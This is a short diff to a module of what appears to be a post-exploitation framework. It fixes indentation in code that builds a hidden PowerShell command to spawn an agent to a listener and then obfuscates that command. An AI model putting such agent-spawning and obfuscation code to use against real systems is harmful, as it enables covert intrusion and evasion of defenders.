@@ -108,8 +108,9 @@ class Module(object):
             parts = stagerCode.split(" ")
 
             script = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
-                script = helpers.keyword_obfuscation(script, self.mainMenu)
+            script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
+
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
             return script
